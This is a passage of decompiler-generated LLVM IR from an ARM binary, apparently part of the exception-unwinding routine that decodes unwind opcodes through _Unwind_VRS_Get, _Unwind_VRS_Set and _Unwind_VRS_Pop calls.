  %v3_22bd8 = load i8, i8* %v2_22bd8, align 1
  %v4_22bd8 = zext i8 %v3_22bd8 to i32
  store i32 %v4_22bd8, i32* %r3.global-to-local, align 4
  %v0_22bdc = load i32, i32* @r4, align 4
  %v1_22bdc = and i32 %v0_22bdc, 32768
  %v2_22bdc = icmp eq i32 %v1_22bdc, 0
  store i1 %v2_22bdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22bdc, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_22bd8
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_22bd8, %bb147
  %v2_22be4 = icmp eq i8 %v3_22bd8, 0
  store i1 %v2_22be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22be4, label %dec_label_pc_22bf4, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_22be8 = add nsw i32 %v4_22bd8, -1
  store i32 %v2_22be8, i32* %r3.global-to-local, align 4
  %v2_22bec = trunc i32 %v2_22be8 to i8
  store i8 %v2_22bec, i8* %v2_22bd8, align 1
  %v0_22bf0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22bf0.pr.pr, label %.thread6.dec_label_pc_22bf4_crit_edge, label %dec_label_pc_22b20

.thread6.dec_label_pc_22bf4_crit_edge:            ; preds = %.thread6
  %v0_22bf4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22bf4

dec_label_pc_22bf4:                               ; preds = %bb148, %.thread6.dec_label_pc_22bf4_crit_edge
  %v0_22bf4 = phi i32 [ %v0_22bf4.pre, %.thread6.dec_label_pc_22bf4_crit_edge ], [ %v0_22bd8, %bb148 ]
  %v1_22bf4 = add i32 %v0_22bf4, 9
  %v2_22bf4 = inttoptr i32 %v1_22bf4 to i8*
  %v3_22bf4 = load i8, i8* %v2_22bf4, align 1
  %v4_22bf4 = zext i8 %v3_22bf4 to i32
  store i32 %v4_22bf4, i32* %r3.global-to-local, align 4
  %v2_22bf8 = icmp eq i8 %v3_22bf4, 0
  store i1 %v2_22bf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22bf8, label %dec_label_pc_22c00, label %dec_label_pc_22b04

dec_label_pc_22c00:                               ; preds = %dec_label_pc_22bf4, %dec_label_pc_22af8, %dec_label_pc_22b20
  %v0_22c00 = load i32, i32* @sl, align 4
  %v2_22c00 = icmp eq i32 %v0_22c00, 0
  store i1 %v2_22c00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22c00, label %dec_label_pc_22cc8, label %bb149

bb149:                                            ; preds = %dec_label_pc_22c00
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22c0c

dec_label_pc_22c0c:                               ; preds = %bb149, %dec_label_pc_2317c, %dec_label_pc_2301c, %dec_label_pc_22e40, %dec_label_pc_22df8, %dec_label_pc_22db4, %dec_label_pc_22cc8
  %v1_22c14 = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_2317c ], [ 9, %dec_label_pc_2301c ], [ 9, %dec_label_pc_22e40 ], [ 9, %dec_label_pc_22df8 ], [ 9, %dec_label_pc_22db4 ], [ %v0_22cfc, %dec_label_pc_22cc8 ]
  store i32 %v9_22ad0, i32* %r6.global-to-local, align 4
  store i32 %v21_22ad0, i32* @lr, align 4
  ret i32 %v1_22c14

dec_label_pc_22c18:                               ; preds = %dec_label_pc_22b3c
  %v1_22c18 = mul i32 %v0_22b3c, 4
  %v3_22c1c = and i32 %v1_22c18, 252
  store i32 %v3_22c1c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_22c28 = load i32, i32* @r7, align 4
  store i32 %v0_22c28, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_22c30 = add nuw nsw i32 %v3_22c1c, 4
  store i32 %v1_22c30, i32* %r6.global-to-local, align 4
  %v5_22c38 = call i32 @_Unwind_VRS_Get(i32 %v0_22c28, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_22c3c = load i32, i32* @r4, align 4
  %v1_22c3c = and i32 %v0_22c3c, 64
  %v2_22c3c = icmp eq i32 %v1_22c3c, 0
  store i1 %v2_22c3c, i1* %cpsr_z.global-to-local, align 1
  %v4_22c44 = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_22c50 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_22c50
  %storemerge160.p = select i1 %v2_22c3c, i32 %v2_22c50, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_22c44
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_22c6c = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_22c6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22ae4.backedge

dec_label_pc_22ae4.backedge:                      ; preds = %dec_label_pc_22c18, %dec_label_pc_22c94, %dec_label_pc_23118, %dec_label_pc_22de4, %dec_label_pc_22e1c, %dec_label_pc_22d9c, %dec_label_pc_23008
  %v0_22ae4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22ae4

dec_label_pc_22c74:                               ; preds = %dec_label_pc_22b44
  %v7_22c74 = icmp eq i32 %v1_22b44, 144
  store i1 %v7_22c74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22c74, label %dec_label_pc_22c7c, label %dec_label_pc_22dbc

dec_label_pc_22c7c:                               ; preds = %dec_label_pc_22c74
  %v1_22c7c = urem i32 %v0_22b3c, 16
  store i32 %v1_22c7c, i32* %r2.global-to-local, align 4
  %v2_22c80 = icmp eq i32 %v1_22c7c, 15
  store i1 %v2_22c80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22c80, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_22c7c
  %v8_22c84 = icmp eq i32 %v1_22c7c, 13
  store i1 %v8_22c84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_22c84, label %bb154, label %dec_label_pc_22c94

.thread21:                                        ; preds = %dec_label_pc_22c7c
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_22db4

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_22db4

dec_label_pc_22c94:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_22ca0 = load i32, i32* @r7, align 4
  store i32 %v0_22ca0, i32* %r0.global-to-local, align 4
  %v5_22ca8 = call i32 @_Unwind_VRS_Get(i32 %v0_22ca0, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_22cb0 = load i32, i32* @r7, align 4
  store i32 %v0_22cb0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_22cc0 = call i32 @_Unwind_VRS_Set(i32 %v0_22cb0, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_22cc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22ae4.backedge

dec_label_pc_22cc8:                               ; preds = %dec_label_pc_22c00
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_22cd8 = load i32, i32* @r7, align 4
  store i32 %v0_22cd8, i32* %r0.global-to-local, align 4
  %v7_22ce0 = call i32 @_Unwind_VRS_Get(i32 %v0_22cd8, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_22ce4 = load i32, i32* @r7, align 4
  store i32 %v0_22ce4, i32* %r0.global-to-local, align 4
  %v0_22ce8 = load i32, i32* @sl, align 4
  store i32 %v0_22ce8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_22ce8, i32* %r3.global-to-local, align 4
  %v5_22cf8 = call i32 @_Unwind_VRS_Set(i32 %v0_22ce4, i32 %v0_22ce8, i32 15, i32 %v0_22ce8, i8* bitcast (i32* @0 to i8*))
  %v0_22cfc = load i32, i32* @sl, align 4
  store i32 %v0_22cfc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22c0c

dec_label_pc_22d04:                               ; preds = %dec_label_pc_22ef8
  %v7_22d04 = icmp eq i32 %v0_22ef8, 199
  store i1 %v7_22d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22d04, label %dec_label_pc_22fd8, label %dec_label_pc_22d0c

dec_label_pc_22d0c:                               ; preds = %dec_label_pc_22d04
  %v1_22d0c = and i32 %v0_22b3c, 248
  store i32 %v1_22d0c, i32* %r3.global-to-local, align 4
  %v7_22d10 = icmp eq i32 %v1_22d0c, 192
  store i1 %v7_22d10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22d10, label %.thread24, label %dec_label_pc_22d28

.thread24:                                        ; preds = %dec_label_pc_22d0c
  %v2_22d14 = urem i32 %v0_22b3c, 16
  %v2_22d18 = add nuw nsw i32 %v2_22d14, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_22d20 = or i32 %v2_22d18, 655360
  store i32 %v2_22d20, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_22de4

dec_label_pc_22d28:                               ; preds = %dec_label_pc_22d0c
  %v7_22d28 = icmp eq i32 %v0_22ef8, 200
  store i1 %v7_22d28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22d28, label %dec_label_pc_22f6c, label %dec_label_pc_22d30

dec_label_pc_22d30:                               ; preds = %dec_label_pc_22d28
  %v7_22d30 = icmp eq i32 %v0_22ef8, 201
  store i1 %v7_22d30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22d30, label %dec_label_pc_22d38, label %dec_label_pc_22db4

dec_label_pc_22d38:                               ; preds = %dec_label_pc_22d30
  %v0_22d38 = load i32, i32* @r5, align 4
  %v1_22d38 = add i32 %v0_22d38, 8
  %v2_22d38 = inttoptr i32 %v1_22d38 to i8*
  %v3_22d38 = load i8, i8* %v2_22d38, align 1
  %v4_22d38 = zext i8 %v3_22d38 to i32
  store i32 %v4_22d38, i32* %r3.global-to-local, align 4
  %v2_22d3c = icmp eq i8 %v3_22d38, 0
  store i1 %v2_22d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22d3c, label %dec_label_pc_22d4c, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_22d38
  %v2_22d40 = add nsw i32 %v4_22d38, -1
  store i32 %v2_22d40, i32* %r3.global-to-local, align 4
  %v2_22d44 = trunc i32 %v2_22d40 to i8
  store i8 %v2_22d44, i8* %v2_22d38, align 1
  %v0_22d48.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22d48.pr.pr, label %.thread26.dec_label_pc_22d4c_crit_edge, label %dec_label_pc_22d80

.thread26.dec_label_pc_22d4c_crit_edge:           ; preds = %.thread26
  %v0_22d4c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22d4c

dec_label_pc_22d4c:                               ; preds = %.thread26.dec_label_pc_22d4c_crit_edge, %dec_label_pc_22d38
  %v2_22d64 = phi i32 [ %v0_22d4c.pre, %.thread26.dec_label_pc_22d4c_crit_edge ], [ %v0_22d38, %dec_label_pc_22d38 ]
  %v1_22d4c = add i32 %v2_22d64, 9
  %v2_22d4c = inttoptr i32 %v1_22d4c to i8*
  %v3_22d4c = load i8, i8* %v2_22d4c, align 1
  %v4_22d4c = zext i8 %v3_22d4c to i32
  store i32 %v4_22d4c, i32* %r3.global-to-local, align 4
  %v2_22d50 = icmp eq i8 %v3_22d4c, 0
  store i1 %v2_22d50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22d50, label %dec_label_pc_22d9c, label %dec_label_pc_22d60

dec_label_pc_22d60:                               ; preds = %dec_label_pc_22d4c
  %v1_22d60 = add nsw i32 %v4_22d4c, -1
  store i32 %v1_22d60, i32* %r3.global-to-local, align 4
  %v1_22d64 = trunc i32 %v1_22d60 to i8
  store i8 %v1_22d64, i8* %v2_22d4c, align 1
  %v0_22d68 = load i32, i32* @r5, align 4
  %v1_22d68 = add i32 %v0_22d68, 4
  %v2_22d68 = inttoptr i32 %v1_22d68 to i32*
  %v3_22d68 = load i32, i32* %v2_22d68, align 4
  store i32 %v3_22d68, i32* %r2.global-to-local, align 4
  %v1_22d6c = inttoptr i32 %v3_22d68 to i32*
  %v2_22d6c = load i32, i32* %v1_22d6c, align 4
  store i32 %v2_22d6c, i32* %r0.global-to-local, align 4
  %v4_22d6c = add i32 %v3_22d68, 4
  store i32 %v4_22d6c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_22d6c, i32* %v2_22d68, align 4
  %v0_22d78 = load i32, i32* %r3.global-to-local, align 4
  %v1_22d78 = trunc i32 %v0_22d78 to i8
  %v2_22d78 = load i32, i32* @r5, align 4
  %v3_22d78 = add i32 %v2_22d78, 8
  %v4_22d78 = inttoptr i32 %v3_22d78 to i8*
  store i8 %v1_22d78, i8* %v4_22d78, align 1
  %v0_22d7c = load i32, i32* %r0.global-to-local, align 4
  %v1_22d7c = load i32, i32* @r5, align 4
  %v2_22d7c = inttoptr i32 %v1_22d7c to i32*
  store i32 %v0_22d7c, i32* %v2_22d7c, align 4
  br label %dec_label_pc_22d80

dec_label_pc_22d80:                               ; preds = %.thread26, %dec_label_pc_22d60
  %v0_22d80 = load i32, i32* %r0.global-to-local, align 4
  %v3_22d80 = udiv i32 %v0_22d80, 16777216
  %v1_22d84 = urem i32 %v3_22d80, 16
  %v3_22d88 = mul i32 %v0_22d80, 256
  %v1_22d8c = add nuw nsw i32 %v1_22d84, 1
  store i32 %v1_22d8c, i32* %r1.global-to-local, align 4
  %v1_22d90 = and i32 %v3_22d80, 240
  store i32 %v1_22d90, i32* %r3.global-to-local, align 4
  %v1_22d94 = load i32, i32* @r5, align 4
  %v2_22d94 = inttoptr i32 %v1_22d94 to i32*
  store i32 %v3_22d88, i32* %v2_22d94, align 4
  %v0_22d98 = load i32, i32* %r1.global-to-local, align 4
  %v1_22d98 = load i32, i32* %r3.global-to-local, align 4
  %v4_22d98 = mul i32 %v1_22d98, 4096
  %v5_22d98 = or i32 %v4_22d98, %v0_22d98
  br label %dec_label_pc_22d9c

dec_label_pc_22d9c:                               ; preds = %dec_label_pc_22d4c, %dec_label_pc_22d80
  %storemerge = phi i32 [ %v5_22d98, %dec_label_pc_22d80 ], [ 720897, %dec_label_pc_22d4c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_22d9c = load i32, i32* @r7, align 4
  store i32 %v0_22d9c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_22da8 = call i32 @_Unwind_VRS_Pop(i32 %v0_22d9c, i32 1, i32 5, i32 5)
  store i32 %v4_22da8, i32* %r0.global-to-local, align 4
  %v2_22dac = icmp eq i32 %v4_22da8, 0
  store i1 %v2_22dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22dac, label %dec_label_pc_22ae4.backedge, label %dec_label_pc_22db4

dec_label_pc_22db4:                               ; preds = %dec_label_pc_23000, %dec_label_pc_22d30, %dec_label_pc_22e10, %dec_label_pc_231b4, %dec_label_pc_23184, %dec_label_pc_23160, %dec_label_pc_22fec, %dec_label_pc_22d9c, %dec_label_pc_22bb0, %dec_label_pc_22ba4, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22c0c

dec_label_pc_22dbc:                               ; preds = %dec_label_pc_22c74
  %v7_22dbc = icmp eq i32 %v1_22b44, 160
  store i1 %v7_22dbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22dbc, label %dec_label_pc_22dc4, label %dec_label_pc_22e00

dec_label_pc_22dc4:                               ; preds = %dec_label_pc_22dbc
  %v0_22dc4 = load i32, i32* %ip.global-to-local, align 4
  %v1_22dc4 = urem i32 %v0_22dc4, 8
  %v1_22dc8 = xor i32 %v1_22dc4, 7
  store i32 %v1_22dc8, i32* %r3.global-to-local, align 4
  %v6_22dd0 = lshr i32 4080, %v1_22dc8
  %v1_22dd4 = and i32 %v0_22b3c, 8
  %v2_22dd4 = icmp eq i32 %v1_22dd4, 0
  store i1 %v2_22dd4, i1* %cpsr_z.global-to-local, align 1
  %v1_22dd8 = and i32 %v6_22dd0, 4080
  %tmp155 = mul nuw nsw i32 %v1_22dd4, 2048
  %tmp156 = or i32 %v1_22dd8, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_22de4

dec_label_pc_22de4:                               ; preds = %.thread44, %.thread24, %dec_label_pc_23174.dec_label_pc_22de4_crit_edge, %bb157, %dec_label_pc_22fd0, %dec_label_pc_22f64, %dec_label_pc_22ec4, %dec_label_pc_22dc4
  %v2_22dec = phi i32 [ %v2_22ee8, %.thread44 ], [ %v2_22ef0, %bb157 ], [ %v2_22dec.pre, %dec_label_pc_23174.dec_label_pc_22de4_crit_edge ], [ %v2_22d20, %.thread24 ], [ %storemerge130, %dec_label_pc_22fd0 ], [ %storemerge131, %dec_label_pc_22f64 ], [ %storemerge132, %dec_label_pc_22ec4 ], [ %tmp156, %dec_label_pc_22dc4 ]
  %v0_22de8 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_23174.dec_label_pc_22de4_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_22fd0 ], [ 3, %dec_label_pc_22f64 ], [ 1, %dec_label_pc_22ec4 ], [ 0, %dec_label_pc_22dc4 ]
  %v0_22de4 = load i32, i32* @r7, align 4
  store i32 %v0_22de4, i32* %r0.global-to-local, align 4
  store i32 %v0_22de8, i32* %r3.global-to-local, align 4
  %v4_22dec = call i32 @_Unwind_VRS_Pop(i32 %v0_22de4, i32 %v0_22de8, i32 %v2_22dec, i32 %v0_22de8)
  store i32 %v4_22dec, i32* %r0.global-to-local, align 4
  %v2_22df0 = icmp eq i32 %v4_22dec, 0
  store i1 %v2_22df0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22df0, label %dec_label_pc_22ae4.backedge, label %dec_label_pc_22df8

dec_label_pc_22df8:                               ; preds = %dec_label_pc_22de4
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22c0c

dec_label_pc_22e00:                               ; preds = %dec_label_pc_22dbc
  %v7_22e00 = icmp eq i32 %v1_22b44, 176
  store i1 %v7_22e00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22e00, label %dec_label_pc_22e48, label %dec_label_pc_22e08

dec_label_pc_22e08:                               ; preds = %dec_label_pc_22e00
  %v7_22e08 = icmp eq i32 %v1_22b44, 192
  store i1 %v7_22e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22e08, label %dec_label_pc_22ef8, label %dec_label_pc_22e10

dec_label_pc_22e10:                               ; preds = %dec_label_pc_22e08
  %v1_22e10 = and i32 %v0_22b3c, 248
  store i32 %v1_22e10, i32* %r3.global-to-local, align 4
  %v7_22e14 = icmp eq i32 %v1_22e10, 208
  store i1 %v7_22e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22e14, label %dec_label_pc_22e1c, label %dec_label_pc_22db4

dec_label_pc_22e1c:                               ; preds = %dec_label_pc_22e10
  %v1_22e1c = urem i32 %v0_22b3c, 8
  %v1_22e20 = add nuw nsw i32 %v1_22e1c, 1
  %v1_22e24 = or i32 %v1_22e20, 524288
  store i32 %v1_22e24, i32* %r2.global-to-local, align 4
  %v0_22e28 = load i32, i32* @r7, align 4
  store i32 %v0_22e28, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_22e34 = call i32 @_Unwind_VRS_Pop(i32 %v0_22e28, i32 1, i32 %v1_22e24, i32 5)
  store i32 %v4_22e34, i32* %r0.global-to-local, align 4
  %v2_22e38 = icmp eq i32 %v4_22e34, 0
  store i1 %v2_22e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22e38, label %dec_label_pc_22ae4.backedge, label %dec_label_pc_22e40

dec_label_pc_22e40:                               ; preds = %dec_label_pc_22e1c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22c0c

dec_label_pc_22e48:                               ; preds = %dec_label_pc_22e00
  %v0_22e48 = load i32, i32* %ip.global-to-local, align 4
  %v7_22e48 = icmp eq i32 %v0_22e48, 177
  store i1 %v7_22e48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22e48, label %dec_label_pc_2314c, label %dec_label_pc_22e50

dec_label_pc_22e50:                               ; preds = %dec_label_pc_22e48
  %v7_22e50 = icmp eq i32 %v0_22e48, 178
  store i1 %v7_22e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22e50, label %dec_label_pc_23024, label %dec_label_pc_22e58

dec_label_pc_22e58:                               ; preds = %dec_label_pc_22e50
  %v7_22e58 = icmp eq i32 %v0_22e48, 179
  store i1 %v7_22e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22e58, label %dec_label_pc_22e60, label %dec_label_pc_22ecc

dec_label_pc_22e60:                               ; preds = %dec_label_pc_22e58
  %v0_22e60 = load i32, i32* @r5, align 4
  %v1_22e60 = add i32 %v0_22e60, 8
  %v2_22e60 = inttoptr i32 %v1_22e60 to i8*
  %v3_22e60 = load i8, i8* %v2_22e60, align 1
  %v4_22e60 = zext i8 %v3_22e60 to i32
  store i32 %v4_22e60, i32* %r3.global-to-local, align 4
  %v2_22e64 = icmp eq i8 %v3_22e60, 0
  store i1 %v2_22e64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22e64, label %dec_label_pc_22e74, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_22e60
  %v2_22e68 = add nsw i32 %v4_22e60, -1
  store i32 %v2_22e68, i32* %r3.global-to-local, align 4
  %v2_22e6c = trunc i32 %v2_22e68 to i8
  store i8 %v2_22e6c, i8* %v2_22e60, align 1
  %v0_22e70.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22e70.pr.pr, label %.thread30.dec_label_pc_22e74_crit_edge, label %dec_label_pc_22ea8

.thread30.dec_label_pc_22e74_crit_edge:           ; preds = %.thread30
  %v0_22e74.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22e74

dec_label_pc_22e74:                               ; preds = %.thread30.dec_label_pc_22e74_crit_edge, %dec_label_pc_22e60
  %v2_22e8c = phi i32 [ %v0_22e74.pre, %.thread30.dec_label_pc_22e74_crit_edge ], [ %v0_22e60, %dec_label_pc_22e60 ]
  %v1_22e74 = add i32 %v2_22e8c, 9
  %v2_22e74 = inttoptr i32 %v1_22e74 to i8*
  %v3_22e74 = load i8, i8* %v2_22e74, align 1
  %v4_22e74 = zext i8 %v3_22e74 to i32
  store i32 %v4_22e74, i32* %r3.global-to-local, align 4
  %v2_22e78 = icmp eq i8 %v3_22e74, 0
  store i1 %v2_22e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22e78, label %dec_label_pc_22ec4, label %dec_label_pc_22e88

dec_label_pc_22e88:                               ; preds = %dec_label_pc_22e74
  %v1_22e88 = add nsw i32 %v4_22e74, -1
  store i32 %v1_22e88, i32* %r3.global-to-local, align 4
  %v1_22e8c = trunc i32 %v1_22e88 to i8
  store i8 %v1_22e8c, i8* %v2_22e74, align 1
  %v0_22e90 = load i32, i32* @r5, align 4
  %v1_22e90 = add i32 %v0_22e90, 4
  %v2_22e90 = inttoptr i32 %v1_22e90 to i32*
  %v3_22e90 = load i32, i32* %v2_22e90, align 4
  store i32 %v3_22e90, i32* %r2.global-to-local, align 4
  %v1_22e94 = inttoptr i32 %v3_22e90 to i32*
  %v2_22e94 = load i32, i32* %v1_22e94, align 4
  store i32 %v2_22e94, i32* %r0.global-to-local, align 4
  %v4_22e94 = add i32 %v3_22e90, 4
  store i32 %v4_22e94, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_22e94, i32* %v2_22e90, align 4
  %v0_22ea0 = load i32, i32* %r3.global-to-local, align 4
  %v1_22ea0 = trunc i32 %v0_22ea0 to i8
  %v2_22ea0 = load i32, i32* @r5, align 4
  %v3_22ea0 = add i32 %v2_22ea0, 8
  %v4_22ea0 = inttoptr i32 %v3_22ea0 to i8*
  store i8 %v1_22ea0, i8* %v4_22ea0, align 1
  %v0_22ea4 = load i32, i32* %r0.global-to-local, align 4
  %v1_22ea4 = load i32, i32* @r5, align 4
  %v2_22ea4 = inttoptr i32 %v1_22ea4 to i32*
  store i32 %v0_22ea4, i32* %v2_22ea4, align 4
  br label %dec_label_pc_22ea8

dec_label_pc_22ea8:                               ; preds = %.thread30, %dec_label_pc_22e88
  %v0_22ea8 = load i32, i32* %r0.global-to-local, align 4
  %v3_22ea8 = udiv i32 %v0_22ea8, 16777216
  %v1_22eac = urem i32 %v3_22ea8, 16
  %v3_22eb0 = mul i32 %v0_22ea8, 256
  store i32 %v3_22eb0, i32* %r0.global-to-local, align 4
  %v1_22eb4 = add nuw nsw i32 %v1_22eac, 1
  store i32 %v1_22eb4, i32* %r2.global-to-local, align 4
  %v1_22eb8 = and i32 %v3_22ea8, 240
  store i32 %v1_22eb8, i32* %r3.global-to-local, align 4
  %v1_22ebc = load i32, i32* @r5, align 4
  %v2_22ebc = inttoptr i32 %v1_22ebc to i32*
  store i32 %v3_22eb0, i32* %v2_22ebc, align 4
  %v0_22ec0 = load i32, i32* %r2.global-to-local, align 4
  %v1_22ec0 = load i32, i32* %r3.global-to-local, align 4
  %v4_22ec0 = mul i32 %v1_22ec0, 4096
  %v5_22ec0 = or i32 %v4_22ec0, %v0_22ec0
  br label %dec_label_pc_22ec4

dec_label_pc_22ec4:                               ; preds = %dec_label_pc_22e74, %dec_label_pc_22ea8
  %storemerge132 = phi i32 [ %v5_22ec0, %dec_label_pc_22ea8 ], [ 720897, %dec_label_pc_22e74 ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_22de4

dec_label_pc_22ecc:                               ; preds = %dec_label_pc_22e58
  %v1_22ecc = and i32 %v0_22b3c, 252
  store i32 %v1_22ecc, i32* %r3.global-to-local, align 4
  %v7_22ed0 = icmp eq i32 %v1_22ecc, 180
  store i1 %v7_22ed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22ed0, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_22ecc
  %v2_22ed4 = urem i32 %v0_22b3c, 4
  %v2_22edc = add nuw nsw i32 %v2_22ed4, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_22ee8 = or i32 %v2_22edc, 262144
  store i32 %v2_22ee8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_22de4

bb157:                                            ; preds = %dec_label_pc_22ecc
  %v2_22ed8 = urem i32 %v0_22e48, 8
  %v2_22ee0 = add nuw nsw i32 %v2_22ed8, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_22ef0 = or i32 %v2_22ee0, 524288
  store i32 %v2_22ef0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_22de4

dec_label_pc_22ef8:                               ; preds = %dec_label_pc_22e08
  %v0_22ef8 = load i32, i32* %ip.global-to-local, align 4
  %v7_22ef8 = icmp eq i32 %v0_22ef8, 198
  store i1 %v7_22ef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22ef8, label %dec_label_pc_22f00, label %dec_label_pc_22d04

dec_label_pc_22f00:                               ; preds = %dec_label_pc_22ef8
  %v0_22f00 = load i32, i32* @r5, align 4
  %v1_22f00 = add i32 %v0_22f00, 8
  %v2_22f00 = inttoptr i32 %v1_22f00 to i8*
  %v3_22f00 = load i8, i8* %v2_22f00, align 1
  %v4_22f00 = zext i8 %v3_22f00 to i32
  store i32 %v4_22f00, i32* %r3.global-to-local, align 4
  %v2_22f04 = icmp eq i8 %v3_22f00, 0
  store i1 %v2_22f04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22f04, label %dec_label_pc_22f14, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_22f00
  %v2_22f08 = add nsw i32 %v4_22f00, -1
  store i32 %v2_22f08, i32* %r3.global-to-local, align 4
  %v2_22f0c = trunc i32 %v2_22f08 to i8
  store i8 %v2_22f0c, i8* %v2_22f00, align 1
  %v0_22f10.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22f10.pr.pr, label %.thread48.dec_label_pc_22f14_crit_edge, label %dec_label_pc_22f48

.thread48.dec_label_pc_22f14_crit_edge:           ; preds = %.thread48
  %v0_22f14.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22f14

dec_label_pc_22f14:                               ; preds = %.thread48.dec_label_pc_22f14_crit_edge, %dec_label_pc_22f00
  %v2_22f2c = phi i32 [ %v0_22f14.pre, %.thread48.dec_label_pc_22f14_crit_edge ], [ %v0_22f00, %dec_label_pc_22f00 ]
  %v1_22f14 = add i32 %v2_22f2c, 9
